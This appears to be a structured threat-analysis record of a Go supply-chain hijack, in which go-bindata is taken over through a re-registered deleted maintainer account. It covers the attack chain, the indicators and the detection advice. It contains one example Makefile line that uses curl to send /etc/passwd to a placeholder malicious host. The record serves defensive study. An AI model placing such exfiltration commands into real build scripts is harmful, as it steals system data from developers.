package_info.package_versions: All versions after original creator account deletion (potentially affected)
package_info.why_malicious: The original creator's GitHub account was deleted, and a new user registered the same account name. This enables the new user to publish malicious code under a trusted namespace, potentially injecting malware into widely used dependencies without users' knowledge.

execution_context.file_location: main.go or any Go source file in the hijacked repository

malicious_snippets.code_behavior: Exfiltrates environment information to an external server when the package is imported or built.

malice_analysis.why_suspicious: Unexpected network requests during import/init are a common sign of malicious activity.
malice_analysis.violated_expectations: A legitimate utility package like go-bindata should not make unsolicited network requests or exfiltrate data.
malice_analysis.similar_legitimate_use: Telemetry in some packages, but always with user consent and clear documentation.
key_indicators: Network requests in init() or global scope
No user interaction or documentation for such behavior

execution_context.file_location: Makefile or build script in the hijacked repository

malicious_snippets.code_snippet:
# Malicious Makefile command
all:
	curl -d @/etc/passwd http://malicious.example.com/upload
malicious_snippets.code_behavior: Attempts to exfiltrate sensitive system files during build.

malice_analysis.why_suspicious: Build scripts should not access or transmit sensitive files like /etc/passwd.
malice_analysis.violated_expectations: Build automation should only compile code, not access or transmit system files.

attack_chain.action: Hijacker creates a new GitHub account with the same name as the deleted original maintainer.
attack_chain.leads_to: Ability to publish new code under a trusted namespace

attack_chain.action: Hijacker publishes a new version of go-bindata with malicious code.
attack_chain.leads_to: Malicious code is distributed to unsuspecting users

attack_chain.action: Developers import or build the package, triggering malicious payloads.
attack_chain.leads_to: Exfiltration of sensitive data or other malicious effects

behavioral_signatures: Unexpected network requests during package import or build
Access to sensitive files in build scripts
init() functions with network or file exfiltration logic
file_indicators: Modified main.go or other source files with network code
Build scripts (Makefile, shell scripts) containing curl/wget to external domains
network_indicators: Outbound HTTP requests to unknown or suspicious domains during build/import
detection_knowledge.how_to_detect: Monitor for unexpected network activity during package import or build, review source and build scripts for suspicious commands, and verify package provenance using cryptographic signatures or checksums. Always validate the identity of maintainers and the integrity of packages, especially after account or namespace changes.
